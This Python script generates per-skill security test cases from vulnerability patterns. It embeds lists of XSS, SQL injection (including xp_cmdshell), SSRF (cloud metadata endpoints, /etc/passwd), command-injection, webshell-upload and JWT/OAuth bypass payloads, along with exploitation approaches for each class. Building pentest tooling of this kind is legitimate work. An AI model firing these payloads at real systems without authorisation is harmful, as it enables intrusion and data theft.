#!/usr/bin/env python3
"""
generate_skill_cases.py — Generate test cases and workflow ideas per skill
from classified vulnerability patterns.

Input:  patterns/ directory (from classify_patterns.py)
Output: by-skill/{skill_name}.json
"""

import argparse
import json
import sys
import os
import pathlib
import hashlib
from collections import defaultdict, Counter
from datetime import datetime


TARGET_MIN_CASES_PER_SKILL = 20


PAYLOAD_TEMPLATES: dict[str, list[str]] = {
    "xss": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"-alert(1)-\"",
        "'-alert(1)-'",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<math><a href=//evil>",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT 1,2,3--",
        "' AND SLEEP(5)--",
        "1' AND '1'='1",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL,NULL--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; EXEC xp_cmdshell('id');--",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80/admin",
        "http://localhost:22",
        "file:///etc/passwd",
        "gopher://localhost:6379/_INFO",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://[::1]:80/admin",
        "http://0.0.0.0:80/admin",
        "http://2130706433:80/",
        "/\\@evil.com",
    ],
    "rce": [
        ";id",
        "|id",
        "`id`",
        "$(id)",
        "${7*7}",
        "{{7*7}}",
        "<%= 7*7 %>",
        "php://filter/convert.base64-encode/resource=index.php",
        "../../etc/passwd",
        "O:8:\"stdClass\":0:{}",
    ],
    "idor": [
        "/api/users/1",
        "/api/users?id=1",
        "/api/users?user_id=1",
        "/api/orders/1000",
        "?accountId=1",
        "?doc=invoice-123.pdf",
        "?uuid=00000000-0000-0000-0000-000000000000",
    ],
    "auth": [
        '{"alg":"none","typ":"JWT"}',
        '{"alg":"HS256","typ":"JWT"}',
        "https://evil.com/oauth/callback",
        "redirect_uri=https://evil.com",
        "code=000000&state=bypass",
        "otp_code=123456",
        "token=eyJhbGciOiJub25lIn0=",
    ],
    "file-upload": [
        "shell.php",
        "shell.php.jpg",
        "shell.php%00.jpg",
        "shell.pHp",
        "shell.Php5",
        "shell.php.",
        "shell.svg",
        "shell.php;.jpg",
        "shell.php .jpg",
        "shell.php/.jpg",
    ],
    "api": [
        '{"isAdmin": true}',
        '{"role": "admin"}',
        '{"id": 1, "email": "attacker@evil.com", "isAdmin": true}',
        "null",
        "true",
        '{"__proto__": {"isAdmin": true}}',
    ],
    "race-condition": [
        "GET /api/claim-coupon HTTP/1.1",
        "POST /api/redeem-v2?concurrent=true",
    ],
    "cors-csrf": [
        "Origin: https://evil.com",
        "Origin: null",
        "Origin: https://sub.victim.com.evil.com",
        '{"csrf_token": ""}',
    ],
    "cloud": [
        "https://s3.amazonaws.com/target-bucket/",
        "https://target.s3.amazonaws.com/",
        "http://169.254.169.254/latest/user-data/",
    ],
    "mobile": [
        "adb logcat | grep -i 'api_key\\|token\\|secret'",
        "strings target.apk | grep -i 'http'",
    ],
}


DETECTION_APPROACHES: dict[str, list[str]] = {
    "xss": [
        "Inject and observe reflection in HTML context without encoding",
        "Inject into tag attribute, breaking out with '\">'",
        "Inject into JavaScript string context, close with '</script>'",
        "Test DOM-based by injecting into URL fragment after hash",
        "Test blind XSS via contact forms / user-agent headers",
        "Polyglot payload to test multiple contexts at once",
        "Inject via HTTP headers (Referer, User-Agent, X-Forwarded-For)",
        "Check for CSP header and test bypass vectors",
    ],
    "sqli": [
        "Single quote test for syntax error in response",
        "Boolean-based: AND 1=1 vs AND 1=2 response difference",
        "Time-based: sleep/delay function with if conditional",
        "UNION SELECT to extract data from other tables",
        "Stacked queries using semicolons for chained statements",
        "Error-based: extract database info from verbose errors",
        "Out-of-band: force DNS/HTTP callback from database server",
        "Second-order SQLi through stored data triggered later",
    ],
    "ssrf": [
        "Supply internal IP (127.0.0.1, 10.x, 172.16-31.x, 192.168.x)",
        "Use cloud metadata endpoints (169.254.169.254, metadata.google.internal)",
        "Bypass blacklists: URL encoding, IPv6, DNS rebinding",
        "Use non-HTTP schemes: file://, gopher://, dict://",
        "Use redirect-based SSRF to bypass allowlists",
        "Blind SSRF: observe time differences or DNS callbacks",
    ],
    "rce": [
        "Inject OS command separators after existing commands",
        "Template injection with {{7*7}}, ${7*7}, <%= 7*7 %>",
        "Path traversal to include sensitive files",
        "Deserialization payloads in cookies, POST bodies, or parameters",
        "Log poisoning via User-Agent injection + LFI include",
        "File upload + path traversal for webshell placement",
    ],
    "idor": [
        "Increment/decrement numeric IDs in URL or request body",
        "Change UUID/GUID to known other user's identifier",
        "Test horizontal (same role, different user) and vertical (role escalation)",
        "Check for predictable ID generation patterns",
        "Test indirect object references via hashed/encoded parameters",
    ],
    "auth": [
        "JWT: test alg=none, alg=HS256 with public key, crack weak HMAC",
        "OAuth: test redirect_uri validation, state parameter, code reuse",
        "Password reset: enumerate users via timing/response differences",
        "2FA: test brute-force on limited codes, response manipulation",
        "Session: test fixation, cookie reuse across sessions, logout bugs",
    ],
    "file-upload": [
        "Fuzz file extensions: .php, .php5, .phtml, .shtml, .asp, .jsp",
        "Bypass extension filtering with double extension, null byte, trailing dots",
        "Bypass content-type checking with magic bytes or polyglots",
        "Upload SVG with embedded JavaScript for stored XSS",
        "Test for path traversal in filename (../../../) to overwrite critical files",
    ],
    "api": [
        "Add sensitive fields to request body (isAdmin, role, balance)",
        "Test for mass assignment by adding unexpected object properties",
        "Change UUID of the resource to another user's identifier",
        "Test GraphQL introspection queries to discover schema",
        "Check for missing authentication on internal/non-documented endpoints",
    ],
    "race-condition": [
        "Send identical requests concurrently with minimal delay",
        "Time the target operation to find the race window size",
        "Token reuse: use same coupon/referral token in parallel requests",
        "Try with high number of concurrent connections (20-50)",
    ],
    "cors-csrf": [
        "Test with Origin: null, arbitrary origin, and subdomain variants",
        "Check if Access-Control-Allow-Credentials: true with wildcard origin",
        "Test CSRF with missing token, blank token, token reuse, and predictable tokens",
        "Check if SameSite cookies are properly set (Lax vs Strict vs None)",
    ],
    "cloud": [
        "Enumerate common bucket names: target-prod, target-dev, target-staging",
        "Test bucket ACLs: list objects, write permissions, public-read",
        "Attempt to access cloud metadata from SSRF entrypoints",
        "Search for leaked credentials in public buckets / object listings",
    ],
    "mobile": [
        "Decompile APK and search for hardcoded API keys / tokens",
        "Test deeplinks for intent hijacking / parameter injection",
        "Intercept HTTPS traffic via proxy + cert installation",
        "Check for insecure data storage (SharedPreferences, SQLite plaintext)",
    ],
}


def generate_test_cases_for_skill(
    skill: str, patterns: list[dict]
) -> list[dict]:
    """Generate test cases from patterns that map to the given skill."""
    payloads = PAYLOAD_TEMPLATES.get(skill, [])
    approaches = DETECTION_APPROACHES.get(skill, [])

    test_cases: list[dict] = []

    for idx, pattern in enumerate(patterns):
        for i, entrypoint in enumerate(pattern.get("sample_reports", [])[:3]):
            payload_idx = idx % len(payloads) if payloads else 0
            approach_idx = idx % len(approaches) if approaches else 0

            case_id = hashlib.sha256(
                f"{skill}|{pattern['pattern_id']}|{i}".encode()
            ).hexdigest()[:10]

            test_case = {
                "case_id": case_id,
                "pattern_name": pattern.get("pattern_name", "unknown"),
                "pattern_ref": pattern.get("pattern_id", "unknown"),
                "bug_type": pattern.get("bug_type", "unknown"),
                "primitive": pattern.get("primitive", "unspecified"),
                "entrypoint": entrypoint[:120] if entrypoint else pattern.get("entrypoint", "unknown"),
                "impact": pattern.get("impact", "unknown"),
                "report_count": pattern.get("report_count", 0),
                "detection_approach": approaches[approach_idx] if approaches else pattern.get("detection_approach", ""),
                "payload_ideas": [payloads[payload_idx]] if payloads else [],
                "skill_mapping": pattern.get("skill_mapping", []),
                "workflow_ideas": pattern.get("workflow_ideas", []),
                "confidence": pattern.get("confidence", "medium"),
            }
            test_cases.append(test_case)

    return test_cases


def generate_synthetic_cases(skill: str, count: int) -> list[dict]:
    """Generate synthetic test cases when pattern-based ones fall short."""
    payloads = PAYLOAD_TEMPLATES.get(skill, ["N/A"])
    approaches = DETECTION_APPROACHES.get(skill, ["N/A"])
    synthetic = []

    generic_entrypoints: dict[str, list[str]] = {
        "xss": ["search bar", "profile bio", "comment field", "URL parameter", "Referer header", "file name", "error message"],
        "sqli": ["login form", "search filter", "sort parameter", "id parameter", "category filter", "cookie value", "REST API path"],
        "ssrf": ["image URL input", "webhook URL", "XML parser", "PDF generator", "redirect parameter", "file fetch API", "proxy endpoint"],
        "rce": ["file upload path", "template editor", "report generator", "import feature", "system ping", "DNS lookup tool"],
        "idor": ["user profile endpoint", "order detail API", "invoice download", "message thread", "notification endpoint"],
        "auth": ["login endpoint", "password reset", "email change", "OAuth callback", "2FA setup", "session refresh", "magic link"],
        "file-upload": ["avatar upload", "document upload", "CSV import", "image editor", "attachment API"],
        "api": ["REST collection endpoint", "GraphQL mutation", "bulk update endpoint", "user search API", "export endpoint"],
        "race-condition": ["coupon redemption", "referral code", "gift card claim", "withdrawal request", "one-time bonus"],
        "cors-csrf": ["sensitive action endpoint", "password change", "email update", "API key generation"],
        "cloud": ["file storage URL", "CDN endpoint", "asset upload path", "backup download"],
        "mobile": ["deeplink path", "API endpoint", "file storage", "login flow"],
    }

    entrypoints = generic_entrypoints.get(skill, ["unmapped-endpoint"])

    for i in range(count):
        case_id = hashlib.sha256(f"synth|{skill}|{i}".encode()).hexdigest()[:10]
        ep = entrypoints[i % len(entrypoints)]
        pl = payloads[i % len(payloads)] if payloads else "N/A"
        ap = approaches[i % len(approaches)] if approaches else "N/A"

        synthetic.append({
            "case_id": case_id,
            "pattern_name": f"generic-{skill}-{i:03d}",
            "pattern_ref": "synthetic",
            "bug_type": skill,
            "primitive": f"{skill}-primitive-{i:03d}",
            "entrypoint": ep,
            "impact": "varies",
            "report_count": 0,
            "detection_approach": ap,
            "payload_ideas": [pl],
            "skill_mapping": [skill],
            "workflow_ideas": [],
            "confidence": "low",
        })

    return synthetic


def main():
    parser = argparse.ArgumentParser(
        description="Generate test cases and workflow ideas per skill from vulnerability patterns"
    )
    parser.add_argument(
        "--patterns",
        required=True,
        help="Directory containing patterns/ JSONL files",
    )
    parser.add_argument(
        "--skill",
        required=True,
        help="Skill name to generate test cases for (e.g. xss, sqli, auth)",
    )
    parser.add_argument(
        "--output",
        default=None,
        help="Output directory for by-skill/ (default: parent of --patterns)",
    )
    args = parser.parse_args()

    patterns_dir = pathlib.Path(args.patterns)
    if not patterns_dir.is_dir():
        print(f"Error: patterns directory '{patterns_dir}' does not exist", file=sys.stderr)
        sys.exit(1)

    if args.output:
        output_dir = pathlib.Path(args.output)
    else:
        output_dir = patterns_dir.parent / "by-skill"
    output_dir.mkdir(parents=True, exist_ok=True)

    skill = args.skill.lower().strip()
    print(f"Generating test cases for skill: {skill}", file=sys.stderr)

    matching_patterns: list[dict] = []

    jsonl_files = sorted(patterns_dir.glob("*.jsonl"))
    if not jsonl_files:
        print(f"Warning: No .jsonl pattern files found in {patterns_dir}", file=sys.stderr)

    for jf in jsonl_files:
        with open(jf, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    pattern = json.loads(line)
                except json.JSONDecodeError:
                    continue
                pattern_skills = pattern.get("skill_mapping", [])
                if skill in pattern_skills:
                    matching_patterns.append(pattern)

    print(f"Found {len(matching_patterns)} patterns mapping to '{skill}'", file=sys.stderr)

    test_cases = generate_test_cases_for_skill(skill, matching_patterns)

    if len(test_cases) < TARGET_MIN_CASES_PER_SKILL:
        needed = TARGET_MIN_CASES_PER_SKILL - len(test_cases)
        print(f"Only {len(test_cases)} cases from patterns, generating {needed} synthetic cases", file=sys.stderr)
        synthetic = generate_synthetic_cases(skill, needed)
        test_cases.extend(synthetic)

    deduped = []
    seen_ids = set()
    for tc in test_cases:
        if tc["case_id"] not in seen_ids:
            seen_ids.add(tc["case_id"])
            deduped.append(tc)

    result = {
        "skill": skill,
        "total_cases": len(deduped),
        "from_patterns": len([c for c in deduped if c.get("pattern_ref") != "synthetic"]),
        "synthetic": len([c for c in deduped if c.get("pattern_ref") == "synthetic"]),
        "generated_at": datetime.utcnow().isoformat() + "Z",
        "test_cases": deduped,
    }

    out_path = output_dir / f"{skill}.json"
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)

    print(f"Wrote {len(deduped)} test cases to {out_path}", file=sys.stderr)

    bug_type_dist = Counter(
        c.get("bug_type", "unknown") for c in deduped
    )
    print("Distribution by bug_type:", file=sys.stderr)
    for bt, count in bug_type_dist.most_common(10):
        print(f"  {bt:25s}: {count:3d}", file=sys.stderr)


if __name__ == "__main__":
    main()